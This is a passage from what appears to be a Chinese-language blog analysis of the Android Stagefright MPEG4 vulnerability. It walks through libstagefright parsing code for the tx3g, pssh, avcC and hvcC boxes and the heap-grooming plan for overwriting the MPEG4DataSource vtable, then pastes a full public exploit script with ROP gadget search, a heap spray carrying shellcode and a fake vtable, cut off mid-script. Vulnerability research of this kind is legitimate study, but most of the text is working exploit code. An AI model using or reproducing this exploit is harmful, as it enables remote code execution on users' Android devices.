kKeyTextFormatData, &amp;type, &amp;data, &amp;size)) &#123;</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[size + chunk_size];</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, data, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">size_t</span>)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</span><br><span class="line">        &lt; chunk_size) &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    buffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>mDataSource</code>就是<code>MPEG4DataSource</code>，大小是0x20。如果我们先构造一个tx3g，其中包含的数据大于0x20, 然后在构造一个tx3g构造大小使得<code>size + chunk_size = 0x20</code>, 然后通过memcpy就可以覆盖<code>MPEG4DataSource</code>虚表了。</p><h3 id="PsshInfo"><a href="#PsshInfo" class="headerlink" title="PsshInfo"></a>PsshInfo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PsshInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> uuid[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> datalen;</span><br><span class="line">    <span class="keyword">uint8_t</span> *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('p', 's', 's', 'h'):</span><br><span class="line">&#123;</span><br><span class="line">    PsshInfo pssh;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">4</span>, &amp;pssh.uuid, <span class="number">16</span>) &lt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> psshdatalen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">20</span>, &amp;psshdatalen, <span class="number">4</span>) &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    pssh.datalen = ntohl(psshdatalen);</span><br><span class="line">    ALOGV(<span class="string">"pssh data size: %d"</span>, pssh.datalen);</span><br><span class="line">    <span class="keyword">if</span> (pssh.datalen + <span class="number">20</span> &gt; chunk_size) &#123;</span><br><span class="line">        <span class="comment">// pssh data length exceeds size of containing box</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    pssh.data = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[pssh.datalen];</span><br><span class="line">    ALOGV(<span class="string">"allocated pssh @ %p"</span>, pssh.data);</span><br><span class="line">    <span class="keyword">ssize_t</span> requested = (<span class="keyword">ssize_t</span>) pssh.datalen;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(data_offset + <span class="number">24</span>, pssh.data, requested) &lt; requested) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    mPssh.push_back(pssh);</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意到的是，在解析完MPEG4格式前，通过pssh分配的内存会一直在内存中。</p><h3 id="avcC-box-和-hvcC-box"><a href="#avcC-box-和-hvcC-box" class="headerlink" title="avcC box 和 hvcC box"></a>avcC box 和 hvcC box</h3><p>这两个基本差不多：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('a', 'v', 'c', 'C'):</span><br><span class="line">&#123;</span><br><span class="line">    sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size);</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 会释放掉原来的 buffer</span></span><br><span class="line">    mLastTrack-&gt;meta-&gt;setData(</span><br><span class="line">            kKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这两个box我们可以分配指定大小的内存，并且可以随时释放前面分配的那个内存块。我们需要使用这个来布局tx3g内存块和MPEG4DataSource内存块。</p><h3 id="修改对象虚表指针"><a href="#修改对象虚表指针" class="headerlink" title="修改对象虚表指针"></a>修改对象虚表指针</h3><ol><li>先清理内存后布局，分配一些0x20的<code>pssh</code>。</li><li>再分配<code>avcC</code>和<code>hvcC</code>，用<code>pssh</code>包裹起来。</li><li>改变<code>hvcC</code>的大小为原来的两倍，使0x20的<code>hvcC</code>被释放，产生一个hole1。</li><li>把<code>MPEG4DataSource</code>分配到hole1上。</li><li>把<code>avcC</code>用同样手段释放，产生hole2。</li><li>利用溢出造一个实际大小大于0x20但是溢出成0x20的<code>tx3g</code>到hole2上，这样就能溢出到<code>MPEG4DataSource</code>。</li></ol><h3 id="堆喷射执行shellcode"><a href="#堆喷射执行shellcode" class="headerlink" title="堆喷射执行shellcode"></a>堆喷射执行shellcode</h3><p>用<code>pssh</code>进行堆喷射，这样就可以在可预测的内存地址中定位到特定数据，数据就是在这里就是用于stack_pivot的gadget。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>来自<a href="https://www.exploit-db.com/exploits/38226" target="_blank" rel="noopener">这里</a>，注释写的很详细了。</p><p>我把代码粘过来是因为这很重要，因为里面还有一些清理内存的操作。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pwnlib.asm <span class="keyword">as</span> asm</span><br><span class="line"><span class="keyword">import</span> pwnlib.elf <span class="keyword">as</span> elf</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'shellcode.bin'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">  shellcode = tmp.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(shellcode) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">  shellcode += <span class="string">'\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># heap grooming configuration</span></span><br><span class="line">alloc_size = <span class="number">0x20</span></span><br><span class="line">groom_count = <span class="number">0x4</span></span><br><span class="line">spray_size = <span class="number">0x100000</span></span><br><span class="line">spray_count = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of the buffer we allocate for our shellcode</span></span><br><span class="line">mmap_address = <span class="number">0x90000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># addresses that we need to predict</span></span><br><span class="line">libc_base = <span class="number">0xb6ebd000</span></span><br><span class="line">spray_address = <span class="number">0xb3000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP gadget addresses</span></span><br><span class="line">stack_pivot = <span class="literal">None</span></span><br><span class="line">pop_pc = <span class="literal">None</span></span><br><span class="line">pop_r0_r1_r2_r3_pc = <span class="literal">None</span></span><br><span class="line">pop_r4_r5_r6_r7_pc = <span class="literal">None</span></span><br><span class="line">ldr_lr_bx_lr = <span class="literal">None</span></span><br><span class="line">ldr_lr_bx_lr_stack_pad = <span class="number">0</span></span><br><span class="line">mmap64 = <span class="literal">None</span></span><br><span class="line">memcpy = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_arm_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_bytes = asm.asm(gadget, arch=<span class="string">'arm'</span>)</span><br><span class="line">  gadget_address = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">for</span> address <span class="keyword">in</span> e.search(gadget_bytes):</span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 为什么要找这种地址</span></span><br><span class="line">    <span class="keyword">if</span> address % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">      gadget_address = address</span><br><span class="line">      <span class="keyword">if</span> gadget_bytes == e.read(gadget_address, len(gadget_bytes)):</span><br><span class="line">        <span class="keyword">print</span> asm.disasm(gadget_bytes, vma=gadget_address, arch=<span class="string">'arm'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">return</span> gadget_address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_thumb_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_bytes = asm.asm(gadget, arch=<span class="string">'thumb'</span>)</span><br><span class="line">  gadget_address = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">for</span> address <span class="keyword">in</span> e.search(gadget_bytes):</span><br><span class="line">    <span class="keyword">if</span> address % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">      gadget_address = address + <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> gadget_bytes == e.read(gadget_address - <span class="number">1</span>, len(gadget_bytes)):</span><br><span class="line">        <span class="keyword">print</span> asm.disasm(gadget_bytes, vma=gadget_address<span class="number">-1</span>, arch=<span class="string">'thumb'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">return</span> gadget_address</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_gadget</span><span class="params">(e, gadget)</span>:</span></span><br><span class="line">  gadget_address = find_thumb_gadget(e, gadget)</span><br><span class="line">  <span class="keyword">if</span> gadget_address <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> gadget_address</span><br><span class="line">  <span class="keyword">return</span> find_arm_gadget(e, gadget)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_rop_gadgets</span><span class="params">(path)</span>:</span></span><br><span class="line">  <span class="keyword">global</span> memcpy</span><br><span class="line">  <span class="keyword">global</span> mmap64</span><br><span class="line">  <span class="keyword">global</span> stack_pivot</span><br><span class="line">  <span class="keyword">global</span> pop_pc</span><br><span class="line">  <span class="keyword">global</span> pop_r0_r1_r2_r3_pc</span><br><span class="line">  <span class="keyword">global</span> pop_r4_r5_r6_r7_pc</span><br><span class="line">  <span class="keyword">global</span> ldr_lr_bx_lr</span><br><span class="line">  <span class="keyword">global</span> ldr_lr_bx_lr_stack_pad</span><br><span class="line"></span><br><span class="line">  e = elf.ELF(path)</span><br><span class="line">  e.address = libc_base</span><br><span class="line"></span><br><span class="line">  memcpy = e.symbols[<span class="string">'memcpy'</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] memcpy : 0x&#123;:08x&#125;'</span>.format(memcpy)</span><br><span class="line">  mmap64 = e.symbols[<span class="string">'mmap64'</span>]</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] mmap64 : 0x&#123;:08x&#125;'</span>.format(mmap64)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># .text:00013344    ADD             R2, R0, #0x4C</span></span><br><span class="line">  <span class="comment"># .text:00013348    LDMIA           R2, &#123;R4-LR&#125;</span></span><br><span class="line">  <span class="comment"># .text:0001334C    TEQ             SP, #0</span></span><br><span class="line">  <span class="comment"># .text:00013350    TEQNE           LR, #0</span></span><br><span class="line">  <span class="comment"># .text:00013354    BEQ             botch_0</span></span><br><span class="line">  <span class="comment"># .text:00013358    MOV             R0, R1</span></span><br><span class="line">  <span class="comment"># .text:0001335C    TEQ             R0, #0</span></span><br><span class="line">  <span class="comment"># .text:00013360    MOVEQ           R0, #1</span></span><br><span class="line">  <span class="comment"># .text:00013364    BX              LR</span></span><br><span class="line"></span><br><span class="line">  pivot_asm = <span class="string">''</span></span><br><span class="line">  pivot_asm += <span class="string">'add   r2, r0, #0x4c\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'ldmia r2, &#123;r4 - lr&#125;\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'teq   sp, #0\n'</span></span><br><span class="line">  pivot_asm += <span class="string">'teqne lr, #0'</span></span><br><span class="line">  stack_pivot = find_arm_gadget(e, pivot_asm)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] stack_pivot : 0x&#123;:08x&#125;'</span>.format(stack_pivot)</span><br><span class="line"></span><br><span class="line">  pop_pc_asm = <span class="string">'pop &#123;pc&#125;'</span></span><br><span class="line">  pop_pc = find_gadget(e, pop_pc_asm)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_pc : 0x&#123;:08x&#125;'</span>.format(pop_pc)</span><br><span class="line"></span><br><span class="line">  pop_r0_r1_r2_r3_pc = find_gadget(e, <span class="string">'pop &#123;r0, r1, r2, r3, pc&#125;'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_r0_r1_r2_r3_pc : 0x&#123;:08x&#125;'</span>.format(pop_r0_r1_r2_r3_pc)</span><br><span class="line"></span><br><span class="line">  pop_r4_r5_r6_r7_pc = find_gadget(e, <span class="string">'pop &#123;r4, r5, r6, r7, pc&#125;'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">'[*] pop_r4_r5_r6_r7_pc : 0x&#123;:08x&#125;'</span>.format(pop_r4_r5_r6_r7_pc)</span><br><span class="line"></span><br><span class="line">  ldr_lr_bx_lr_stack_pad = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">4</span>):</span><br><span class="line">    ldr_lr_bx_lr_asm =  <span class="string">'ldr lr, [sp, #0x&#123;:08x&#125;]\n'</span>.format(i)</span><br><span class="line">    ldr_lr_bx_lr_asm += <span class="string">'add sp, sp, #0x&#123;:08x&#125;\n'</span>.format(i + <span class="number">8</span>)</span><br><span class="line">    ldr_lr_bx_lr_asm += <span class="string">'bx  lr'</span></span><br><span class="line">    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)</span><br><span class="line">    <span class="keyword">if</span> ldr_lr_bx_lr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">      ldr_lr_bx_lr_stack_pad = i</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(size)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'#'</span> * size</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pb32</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&gt;I"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pb64</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&gt;Q"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p64</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunk</span><span class="params">(tag, data, length=<span class="number">0</span>)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">    length = len(data) + <span class="number">8</span></span><br><span class="line">  <span class="keyword">if</span> length &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">    <span class="keyword">return</span> pb32(<span class="number">1</span>) + tag + pb64(length)+ data</span><br><span class="line">  <span class="keyword">return</span> pb32(length) + tag + data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_avcc</span><span class="params">(size)</span>:</span></span><br><span class="line">  avcc = <span class="string">'A'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'avcC'</span>, avcc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_hvcc</span><span class="params">(size)</span>:</span></span><br><span class="line">  hvcc = <span class="string">'H'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'hvcC'</span>, hvcc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sample_table</span><span class="params">(data)</span>:</span></span><br><span class="line">  stbl = <span class="string">''</span></span><br><span class="line">  stbl += chunk(<span class="string">'stco'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stsc'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stsz'</span>, <span class="string">'\x00'</span> * <span class="number">12</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stts'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += data</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'stbl'</span>, stbl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memory_leak</span><span class="params">(size)</span>:</span></span><br><span class="line">  pssh = <span class="string">'leak'</span></span><br><span class="line">  pssh += <span class="string">'L'</span> * <span class="number">16</span></span><br><span class="line">  pssh += pb32(size)</span><br><span class="line">  pssh += <span class="string">'L'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'pssh'</span>, pssh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_spray</span><span class="params">(size)</span>:</span></span><br><span class="line">  pssh = <span class="string">'spry'</span></span><br><span class="line">  pssh += <span class="string">'S'</span> * <span class="number">16</span></span><br><span class="line">  pssh += pb32(size)</span><br><span class="line"></span><br><span class="line">  page = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  nop = asm.asm(<span class="string">'nop'</span>, arch=<span class="string">'thumb'</span>)</span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0x100</span>:</span><br><span class="line">    page += nop</span><br><span class="line">  page += shellcode</span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0xed0</span>:</span><br><span class="line">    page += <span class="string">'\xcc'</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># MPEG4DataSource fake vtable</span></span><br><span class="line">  page += p32(stack_pivot)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># pivot swaps stack then returns to pop &#123;pc&#125;</span></span><br><span class="line">  page += p32(pop_r0_r1_r2_r3_pc)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># mmap64(mmap_address,</span></span><br><span class="line">  <span class="comment">#        0x1000,</span></span><br><span class="line">  <span class="comment">#        PROT_READ | PROT_WRITE | PROT_EXECUTE,</span></span><br><span class="line">  <span class="comment">#        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,</span></span><br><span class="line">  <span class="comment">#        -1,</span></span><br><span class="line">  <span class="comment">#        